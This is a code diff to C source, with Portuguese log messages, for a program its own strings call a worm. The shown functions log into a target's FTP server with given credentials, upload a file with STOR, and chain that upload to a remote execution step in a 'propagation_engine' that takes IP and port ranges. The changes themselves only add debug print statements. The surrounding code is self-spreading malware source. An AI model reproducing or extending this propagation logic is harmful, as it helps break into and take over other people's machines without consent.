@@ -105,6 +105,7 @@ void fileTransfer(char *ip, char *username, char *password){
     serverAddr.sin_family = AF_INET;
     serverAddr.sin_port = htons(21);
 
+    printf("Conectando:\n");
     if(connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0){
         printf("Erro: conexao falhou. \n");
         exit(1);
@@ -115,6 +116,7 @@ void fileTransfer(char *ip, char *username, char *password){
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
 
+    printf("Enviando usuario: %s\n",username);
     //Enviando nome do usuario
     memset(buffer, '0', 1024);
     strcat(user, username);    
@@ -129,6 +131,7 @@ void fileTransfer(char *ip, char *username, char *password){
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
 
+    printf("Enviando senha: %s\n",password);
     //Enviando senha
     memset(buffer, '0', 1024);
     strcat(pass, password);
@@ -143,6 +146,7 @@ void fileTransfer(char *ip, char *username, char *password){
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
 
+    printf("Enviando Modo de Transferencia: Stream\n");
     //Enviando Modo de Transferencia: Stream
     memset(buffer, '0', 1024);
     send(sock, model, strlen(model), 0);
@@ -152,6 +156,7 @@ void fileTransfer(char *ip, char *username, char *password){
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
  
+    printf("Enviando Tipo de Transferencia: Binario\n");
     //Enviando Tipo de Transferencia: Binario
     memset(buffer, '0', 1024);
     send(sock, type, strlen(type), 0);
@@ -161,6 +166,7 @@ void fileTransfer(char *ip, char *username, char *password){
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
 
+    printf("Enviando Tipo de Estrutura de Dados: F\n");
     //Enviando Estrutura de Dados: F
     memset(buffer, '0', 1024);
     send(sock, stru, strlen(stru), 0);
@@ -170,6 +176,7 @@ void fileTransfer(char *ip, char *username, char *password){
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
 
+    printf("Enviando Passive Mode\n");
     //Enviando Passive Mode'
     memset(buffer, '0', 1024);
     send(sock, pasv, strlen(pasv), 0);
@@ -182,6 +189,7 @@ void fileTransfer(char *ip, char *username, char *password){
     //Parse para pegar IP e Porta
     parseIPPort(buffer, ipT, &port);
 
+    printf("Enviando cwd %s\n",username);
     //Enviando comando 'CD'
     memset(buffer, '0', 1024);
     strcat(cwd, username);
@@ -193,6 +201,7 @@ void fileTransfer(char *ip, char *username, char *password){
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
     
+    printf("Enviando pwd\n");
     //Enviando comando 'PWD'
     memset(buffer, '0', 1024);
     send(sock, pwd, strlen(pwd), 0);
@@ -202,6 +211,7 @@ void fileTransfer(char *ip, char *username, char *password){
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
 
+    printf("Enviando %s",mkd);
     //Enviando comando 'MKD'
     memset(buffer, '0', 1024);
     send(sock, mkd, strlen(mkd), 0);
@@ -211,6 +221,7 @@ void fileTransfer(char *ip, char *username, char *password){
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
 
+    printf("Enviando %s",cwdWD);
     //Enviando comando 'CD'
     memset(buffer, '0', 1024);
     send(sock, cwdWD, strlen(cwdWD), 0);
@@ -220,6 +231,7 @@ void fileTransfer(char *ip, char *username, char *password){
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
     
+    printf("Enviando %s",pwd);
     //Enviando comando 'PWD'
     memset(buffer, '0', 1024);
     send(sock, pwd, strlen(pwd), 0);
@@ -229,10 +241,13 @@ void fileTransfer(char *ip, char *username, char *password){
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
     
+    printf("Enviando %s",stor);
     //Enviando comando STRO
     memset(buffer, '0', 1024);
     send(sock, stor, strlen(stor), 0);
 
+    printf("connect FTP\n");
+    
     //CONNECT FTP
     sockT = socket(AF_INET, SOCK_STREAM, 0);
     if(sock < 0){
@@ -246,7 +261,7 @@ void fileTransfer(char *ip, char *username, char *password){
     transfSock.sin_port = htons(port);
 
     if(connect(sockT, (struct sockaddr*)&transfSock, sizeof(transfSock)) < 0){
-         perror("");
+         perror("não foi possível conectar com sockt\n");
          exit(1);
     }
   
@@ -387,6 +402,8 @@ void fileExecute(char *ip, char *username, char *pass, char range_ipSeq[], char 
 }
 
 void propagation_engine(char* ip, char *username, char *pass, char range_ipSeq[], char range_portSeq[], int lenKey){    
+    printf("Transferindo o worm\n");
     fileTransfer(ip, username, pass);
+    printf("Executando o worm\n");
     fileExecute(ip, username, pass, range_ipSeq, range_portSeq, lenKey);
 }
